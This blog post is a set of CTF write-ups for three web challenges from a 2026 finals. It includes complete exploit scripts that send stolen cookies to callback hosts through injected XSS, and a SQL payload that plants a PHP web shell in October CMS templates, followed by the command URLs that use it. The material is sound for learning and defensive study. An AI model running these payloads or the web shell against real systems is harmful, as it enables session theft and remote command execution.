---
title: "ROCSC Final Web Solves"
date: 2026-05-13 12:00:00 +0300
tags: [CTF, ROCSC2026, Web]
categories: [CTF, Writeups]
ctf: "ROCSC Finals 2026"
---

## Overview

This post covers web challenges from **ROCSC Final 2026**.



## Underground Forum

**Metadata**

```yaml
title: "Underground Forum writeup"
category: web
author: "Shad"
```

### Summary

Underground Forum looks like a small Next.js forum with reported replies reviewed by an admin bot. Replies are sanitized before rendering, so the useful bug is not a direct stored XSS in the reply body. The real primitive is that the report system stores the reporter's `session_token`, and the bot later replays that stored value as a request header while visiting the reported reply.

Because the app uses Next.js `16.1.7`, a crafted `Content-Security-Policy` request header can be used to abuse framework nonce handling and inject a `data:` script into generated markup. This matches the [CSP2XSS Next.js issue / CVE-2026-44581](https://aisafe.io/blog/csp2xss-nextjs-vulnerability). The admin bot stores the flag in a non-HttpOnly cookie, so JavaScript running in the bot can read and exfiltrate `document.cookie`.

### Relevant Code

The middleware creates an anonymous session cookie. It is deliberately readable by JavaScript:

```ts
response.cookies.set("session_token", generateToken(), {
  path: "/",
  httpOnly: false,
  sameSite: "lax",
  maxAge: 60 * 60 * 24 * 7,
});
```

When a reply is reported, the server action stores the raw session token:

```ts
const token = await getSessionToken();
createReport({
  reply_id: replyId,
  reporter_token: token,
  reason: reason || "(no reason provided)",
});
```

The bot later takes that database value and turns it into a request header:

```ts
const formatted = reporterSession.includes(":")
  ? reporterSession
  : `Requester-Session: ${reporterSession}`;

const [name, value] = formatted.split(": ", 2);

await page.setRequestInterception(true);
page.on("request", async (req) => {
  const existing = req.headers();
  const present = new Set(
    Object.keys(existing).map((k) => k.toLowerCase()),
  );
  const headers = { ...existing };
  if (name && !present.has(name.toLowerCase())) {
    headers[name] = value;
  }
  await req.continue({ headers });
});
```

The important detail is that the bot checks for `:`, but splits on `: `. The cookie value therefore needs to contain a header name, a colon, a space, and the header value.

### Exploit Path

A normal session token is replayed as `Requester-Session: <token>`. If the reporter controls the cookie value, this instead becomes an arbitrary header:

```http
Cookie: session_token=Content-Security-Policy: script-src 'nonce-...'
```

The bot then visits the reported page with:

```http
Content-Security-Policy: script-src 'nonce-...'
```

The nonce payload breaks out of the generated `nonce="..."` attribute by injecting a quote:

```http
Content-Security-Policy: script-src 'nonce-x"src=data:text/javascript,fetch(...)//'
```

That turns framework-generated script markup into an attacker-controlled `data:` script source. The payload can then read the bot's readable cookies:

```js
fetch("https://example.oastify.com/leak?c=" + encodeURIComponent(document.cookie))
```

The bot sets the interesting cookies immediately before the visit:

```ts
const adminCookies: CookieData[] = [
  {
    name: "flag",
    value: flag,
    domain: url.hostname,
    path: "/",
    httpOnly: false,
    secure: false,
    sameSite: "Lax",
  },
  {
    name: "admin_session",
    value: "admin_" + cryptoRandom(),
    domain: url.hostname,
    path: "/",
    httpOnly: false,
    secure: false,
    sameSite: "Lax",
  },
  {
    name: "role",
    value: "admin",
    domain: url.hostname,
    path: "/",
    httpOnly: false,
    secure: false,
    sameSite: "Lax",
  },
];
```

### Minimal Submission Script

The action ID is the server action ID for `reportReplyAction`. I used the generated manifest locally to extract it.

```python
#!/usr/bin/env python3
import sys
import requests

TARGET = sys.argv[1].rstrip("/")
CALLBACK = sys.argv[2]
POST_ID = sys.argv[3] if len(sys.argv) > 3 else "1"
REPLY_ID = sys.argv[4] if len(sys.argv) > 4 else "1"

REPORT_ACTION = "6071566d370cd36f68948a82a7c1104adde0d67720"

def js_string(s):
    return "String.fromCharCode(" + ",".join(str(ord(c)) for c in s) + ")"

js = f"fetch({js_string(CALLBACK)}+encodeURIComponent(document.cookie))"
nonce = f'x"src=data:text/javascript,{js}//'
session_token = f"Content-Security-Policy: script-src 'nonce-{nonce}'"

files = {
    "1_reply_id": (None, REPLY_ID),
    "1_reason": (None, "csp2xss"),
    "0": (None, '[{"ok":false,"message":""},"$K1"]'),
}

headers = {
    "next-action": REPORT_ACTION,
    "accept": "text/x-component",
    "origin": TARGET,
    "referer": f"{TARGET}/posts/{POST_ID}",
}

r = requests.post(
    f"{TARGET}/posts/{POST_ID}",
    headers=headers,
    cookies={"session_token": session_token},
    files=files,
    timeout=15,
)

print("status:", r.status_code)
print("wait for callback:", CALLBACK)
```

Run:

```bash
python3 exploit.py 'http://localhost:3000' 'https://example.oastify.com/leak?c=' 1 1
```

The callback receives cookies similar to:

```text
flag=FLAG{...}; admin_session=admin_...; role=admin
```


## Depressionfest / October CMS

**Metadata**

```yaml
title: "depressionfest writeup"
category: web
author: "Mal"
```

### Summary

The challenge is an October CMS `4.1.9` instance backed by MariaDB. The default backend account is `test:test`, but it is not a superuser. The first stage is to recover the live database password and promote that backend user by updating `backend_users.is_superuser`. The second stage is command execution through database-backed CMS template content, which is needed because the final flag is created under a randomized path and chmoded to `000`.

The are two ways to reach the first flag:

- First path: recover the randomized database password from the live `.env`.
- Second path: place `${DB_PASSWORD}` into editable October CMS fields and preview it, leaking the same password.

![admin page](/assets/img/posts/rocsc2026/final-web-solves/image.png)

### Target Facts

From the Dockerfile and entrypoint:

```yaml
cms: "October CMS 4.1.9"
database: "MariaDB"
database_name: "october"
database_user: "october"
backend_credentials: "test:test"
safe_mode: true
```

The Docker build creates the `october` DB user with password `test`, but the entrypoint changes it on every boot:

```bash
db_pass=$(head -c 24 /dev/urandom | base64 -w0 | tr "/" "_")
mysql -e "SET PASSWORD FOR 'october'@'%' = PASSWORD('$db_pass')"
mysql -e 'FLUSH PRIVILEGES'

cd /home/ctf/october-4.1.9
sed -i "s/^DB_PASSWORD=.*/DB_PASSWORD=$db_pass/" .env
php artisan config:clear
```

MariaDB is then made reachable outside localhost:

```bash
sed -i 's/^bind-address\s*=.*/bind-address = 0.0.0.0/' /etc/mysql/mariadb.conf.d/50-server.cnf
service mariadb restart
```

### Flag 1 - Path 1: Read the Live `.env`

The live app `/.env` contains the randomized database password after the entrypoint rewrites it.

![DB Pass in .env](/assets/img/posts/rocsc2026/final-web-solves/image-1.png)

With that password, connect to MariaDB as user `october`, select the `october` database, and promote the seeded backend user:

```sql
UPDATE backend_users
SET is_superuser = 1
WHERE id = 2;
```

The rough notes captured the successful update:

```text
MariaDB [october]> update backend_users set is_superuser = 1 where id = 2;
Query OK, 1 row affected (0.005 sec)
Rows matched: 1  Changed: 1  Warnings: 0
```

![Creds](/assets/img/posts/rocsc2026/final-web-solves/image-2.png)

After that, log in at `/admin` with:

```text
test:test
```

The entrypoint places the first flag in the system updates toolbar by replacing `Manage Themes`:

```bash
sed -i "s/Manage Themes/CTF\{...\}/" \
  /home/ctf/october-4.1.9/modules/system/controllers/updates/_list_toolbar.php
```

Open the updates page:

```text
http://127.0.0.1:8000/admin/system/updates
```

![Flag 1](/assets/img/posts/rocsc2026/final-web-solves/image-3.png)

### Flag 1 - Path 2: Leak `${DB_PASSWORD}` Through October CMS

The second path starts from the default backend login. Authenticate with `test:test`, then use the environment-variable disclosure behavior described for [CVE-2026-25125](https://www.sentinelone.com/vulnerability-database/cve-2026-25125/) by placing this value into editable CMS fields:

```text
${DB_PASSWORD}
```

![setting ${DB_PASSWORD} everywhere](/assets/img/posts/rocsc2026/final-web-solves/image-4.png)

Previewing the edited content resolves the environment placeholder and displays the live database password:

![Password](/assets/img/posts/rocsc2026/final-web-solves/image-5.png)

From there, the rest is the same:

```sql
UPDATE backend_users
SET is_superuser = 1
WHERE id = 2;
```

Log back in with `test:test`, then visit:

```text
http://127.0.0.1:8000/admin/system/updates
```

### Flag 2 - Command Execution Through Database Templates

The final flag cannot be read through a normal file-read primitive. The entrypoint creates a three-level randomized path and removes all permissions from the flag file:

```bash
mkdir -p "/home/ctf/flag/$(head -n 10 /dev/urandom | sha256sum | tr -d ' ')/$(head -n 10 /dev/urandom | sha256sum | tr -d ' ')/$(head -n 10 /dev/urandom | sha256sum | tr -d ' ')"
cd /home/ctf/flag/*/*/*/ && echo 'CTF{...}' > flag.txt
chmod 000 /home/ctf/flag/*/*/*/flag.txt
```

So the objective becomes command execution as the app user.

Once admin and database access are available, enable or use database-backed CMS template storage. That gives a direct database row to edit for a CMS page/template. The technique follows the same idea documented in the October CMS [CVE-2022-21705 write-up](https://cyllective.com/blog/posts/cve-2022-21705-octobercms): get executable CMS template content into a place the application will render.

![Database-mode being enabled](/assets/img/posts/rocsc2026/final-web-solves/image-6.png)

Create a page/template or identify the existing one in the database:

![DB page](/assets/img/posts/rocsc2026/final-web-solves/image-7.png)

Overwrite the template content with an `onInit()` handler:

```sql
UPDATE cms_theme_templates
SET content = "title = \"pagewithcode\" \nurl = \"\/pagewithcode\" \ndescription = \"descriptionfield\" \nmeta_title = \"metatitle\" \nmeta_description = \"metadescription\" \nis_hidden = 0 \n==\nfunction onInit() {\n    system($_GET['cmd']);\n}\n==\n"
WHERE id = 1;
```

Previewing or visiting `/pagewithcode` now executes the `cmd` parameter:

```text
http://127.0.0.1:8000/pagewithcode?cmd=id
```

![RCE](/assets/img/posts/rocsc2026/final-web-solves/image-8.png)

The exact flag path changes, but the directory depth is stable:

```text
/home/ctf/flag/*/*/*/flag.txt
```

Change the permissions and read it:

```text
http://127.0.0.1:8000/pagewithcode?cmd=chmod+666+/home/ctf/flag/*/*/*/flag.txt
http://127.0.0.1:8000/pagewithcode?cmd=cat+/home/ctf/flag/*/*/*/flag.txt
```

![Final Flag](/assets/img/posts/rocsc2026/final-web-solves/image-9.png)

## zeroxss

**Metadata**

```yaml
title: "zeroxss writeup"
category: web
author: "Mtib"
```

### Summary

`zeroxss` is a web challenge split across two subdomains:

| Host | Role | Bug |
| --- | --- | --- |
| `id.mtib.xyz` | identity provider | reflected DOM XSS on `/sso/error` |
| `notes.mtib.xyz` | notes app and report bot | user-controlled theme fields can assign to `document.domain` |

The admin bot logs in through the identity provider, then sets the flag as a readable cookie on `notes.mtib.xyz`. The exploit runs JavaScript on `id.mtib.xyz`, makes both pages relax to `mtib.xyz`, loads the notes origin in an iframe, and reads the iframe's `document.cookie`.

### Step 1: DOM XSS on the IDP

The IDP error template places the query string description into a `data-description` attribute:

```html
<div id="desc" class="error-box" data-description="<%= description %>"></div>

<script>
  const desc = document.getElementById("desc");
  desc.innerHTML = desc.dataset.description;
</script>
```

EJS escapes the attribute, but the browser decodes it when exposed through `dataset.description`. The assignment to `innerHTML` then parses it as markup.

A minimal proof is:

```text
http://id.mtib.xyz/sso/error?error=access_denied&error_description=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
```

The payload uses an event handler because script tags inserted through `innerHTML` are not a reliable execution primitive.

### Step 2: Make the Notes Origin Relax Too

The flag is set by the notes admin bot, not by the IDP:

```js
await page.setCookie({
  name: "flag",
  value: FLAG,
  url: `http://notes.${BASE_DOMAIN}/`,
  path: "/",
  httpOnly: false,
  secure: false,
  sameSite: "Lax",
});
```

The notes frontend loads note theme data and applies it like this:

```js
function getDefaultTheme(theme) {
  return {
    color: theme.color ?? "#222222",
    backgroundColor: theme.backgroundColor ?? "#ffffff",
    domain: theme.colorDomain ?? "#f3f3f3",
  };
}

function getThemeHandle(id) {
  return window[id] || (window[id] = {});
}

const themeState = Object.assign(
  getThemeHandle(noteData.theme.id),
  getDefaultTheme(noteData.theme)
);
```

If a note has:

```text
id=document
colorDomain=mtib.xyz
```

then `getThemeHandle("document")` returns the real `document` object, and the assignment becomes:

```js
Object.assign(document, { domain: "mtib.xyz" });
```

That sets `document.domain` on the notes page. The IDP XSS can set the same value on its own page, which brings both subdomains into the same relaxed origin for browser access checks.

### Step 3: Report the Cross-Origin Payload

The report endpoint is authenticated, so the script needs a normal valid `sso` cookie for a user account. The report URL itself points the admin bot at the IDP XSS.

```python
#!/usr/bin/env python3
from urllib.parse import quote
import requests

NOTES = "http://notes.mtib.xyz"
IDP = "http://id.mtib.xyz"
WEBHOOK = "https://webhook.site/replace-me"

cookies = {
    "sso": "YOUR_VALID_SSO_COOKIE",
}

js = r"""
(() => {
  const webhook = "WEBHOOK_PLACEHOLDER";
  const leak = s => new Image().src = webhook + "?s=" + encodeURIComponent(s);

  document.domain = "mtib.xyz";

  const iframe = document.createElement("iframe");
  iframe.name = "f";
  iframe.style.display = "none";
  document.body.appendChild(iframe);

  const form = document.createElement("form");
  form.method = "POST";
  form.action = "http://notes.mtib.xyz/notes";
  form.target = "f";

  const fields = {
    title: "x",
    body: "x",
    id: "document",
    color: "black",
    backgroundColor: "white",
    colorDomain: "mtib.xyz",
  };

  for (const [name, value] of Object.entries(fields)) {
    const input = document.createElement("input");
    input.name = name;
    input.value = value;
    form.appendChild(input);
  }

  document.body.appendChild(form);
  form.submit();

  const timer = setInterval(() => {
    try {
      const cookie = iframe.contentWindow.document.cookie;
      leak(cookie);
      if (cookie) clearInterval(timer);
    } catch (_) {}
  }, 250);
})();
""".replace("WEBHOOK_PLACEHOLDER", WEBHOOK)

xss = f"<img src=x onerror='{js}'>"
target = f"{IDP}/sso/error?error=access_denied&error_description={quote(xss, safe='')}"

r = requests.post(f"{NOTES}/report", cookies=cookies, data={"url": target})
print(r.status_code)
print(r.text)
```

Expected callback:

```text
s=flag=ROCSC{...}
```


